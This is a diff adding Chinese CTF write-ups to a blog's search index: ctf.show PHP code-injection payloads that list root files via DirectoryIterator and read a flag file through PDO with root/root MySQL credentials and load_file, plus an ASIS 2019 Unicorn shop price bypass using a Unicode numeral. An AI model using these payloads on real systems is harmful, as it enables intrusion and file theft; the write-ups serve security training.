@@ -1177,9 +1177,54 @@
 <p>payload：</p>
 <p><code>?&gt;&lt;?php $a = new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo $f-&gt;__toString().&quot; &quot;;&#125;exit();</code></p>
 <p>可以找到flag36.txt文件</p>
+<p>这里需要用到PDO类链接数据库</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">php页面链接数据库例子：</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">dbms=<span class="string">&#x27;mysql&#x27;</span>;     //数据库类型</span></span><br><span class="line"><span class="meta">$</span><span class="bash">host=<span class="string">&#x27;localhost&#x27;</span>; //数据库主机名</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dbName=<span class="string">&#x27;test&#x27;</span>;    //使用的数据库</span></span><br><span class="line"><span class="meta">$</span><span class="bash">user=<span class="string">&#x27;root&#x27;</span>;      //数据库连接用户名</span></span><br><span class="line"><span class="meta">$</span><span class="bash">pass=<span class="string">&#x27;&#x27;</span>;          //对应的密码</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dsn=<span class="string">&quot;<span class="variable">$dbms</span>:host=<span class="variable">$host</span>;dbname=<span class="variable">$dbName</span>&quot;</span>;</span></span><br></pre></td></tr></table></figure>
+
+<p>所以我们现在需要初始化的内容<code>$dbh = new PDO($dsn, $user, $pass); *//初始化一个PDO对象*</code></p>
+<p>需要提供账号密码还有数据库信息</p>
+<p>不知道师傅们是怎么拿到数据库的信息的：</p>
+<p>payload：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">try&#123;</span><br><span class="line"><span class="meta">	$</span><span class="bash">dbh = new PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span></span><br><span class="line"><span class="meta">	foreach($</span><span class="bash">dbh-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>)as <span class="variable">$row</span>)&#123;</span></span><br><span class="line"><span class="meta">		echo($</span><span class="bash">row[0]).<span class="string">&quot;|&quot;</span>;&#125;</span></span><br><span class="line"><span class="meta">		$</span><span class="bash">dbh = NULL;</span></span><br><span class="line">	</span><br><span class="line">&#125;catch (POException $e)&#123;</span><br><span class="line">	echo $e-&gt;getMessage();</span><br><span class="line">	die();	</span><br><span class="line">	&#125;exit();</span><br></pre></td></tr></table></figure>
+
+
+
+<p>c=try {$dbh = new PDO(‘mysql:host=localhost;dbname=ctftraining’, ‘root’, ‘root’);foreach($dbh-&gt;query(‘select load_file(“/flag36.txt”)’) as $row) {echo($row[0]).”|”; }$dbh = null;}catch (PDOException $e) {echo $e- &gt;getMessage();<strong>exit</strong>(0);}<strong>exit</strong>(0);</p>
+<p>原理：在数据库中查找flag36.txt然后抛出异常，输出其中内容</p>
 <h3 id="web-76"><a href="#web-76" class="headerlink" title="web 76"></a>web 76</h3>]]></content>
       <tags>
         <tag>ctf-show</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Unicorn shop</title>
+    <url>/2022/02/28/Unicorn-shop/</url>
+    <content><![CDATA[<h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p>刷题刷题。</p>
+<p>题目名字是独角兽商店</p>
+<p>进去看看</p>
+<p><img src="/2022/02/28/Unicorn-shop/6.png" alt="1"></p>
+<p>意思是我们输入商品名还有价钱来购买它</p>
+<p>啥也不输直接点购买看看会出现什么问题：</p>
+<p><img src="/2022/02/28/Unicorn-shop/1.png" alt="1"></p>
+<p>可以看到返回了一堆目录还有一个报错</p>
+<p>需要一个单独的unicode字符串作为参数</p>
+<p>那么我们试试输入，购买上面的便宜的商品看看，</p>
+<p>发现</p>
+<p><img src="/2022/02/28/Unicorn-shop/2.png" alt="1"></p>
+<p>测试一个最下面的那个，最下面吗那个应该是我们需要购买的flag</p>
+<p><img src="/2022/02/28/Unicorn-shop/4.png" alt="1"></p>
+<p>也不让访问</p>
+<p>看看源码</p>
+<p><img src="/2022/02/28/Unicorn-shop/3.png" alt="1"></p>
+<p>他在编码后面添加了一句提示，那么可能在编码方面可能会出现一些问题，上网查了一下，我们需要找到一个字符，它的数值需要大于1337，从而绕过这个过滤</p>
+<p>可以在这里找</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://www.compart.com/en/unicode/</span><br></pre></td></tr></table></figure>
+
+<p>直接搜索thousand，在里面找，只要它的数值大于1337的就行了</p>
+<p><img src="/2022/02/28/Unicorn-shop/5.png" alt="1"></p>
+<p>输入，返回flag</p>
+]]></content>
+      <tags>
+        <tag>ASIS</tag>
       </tags>
   </entry>
 </search>
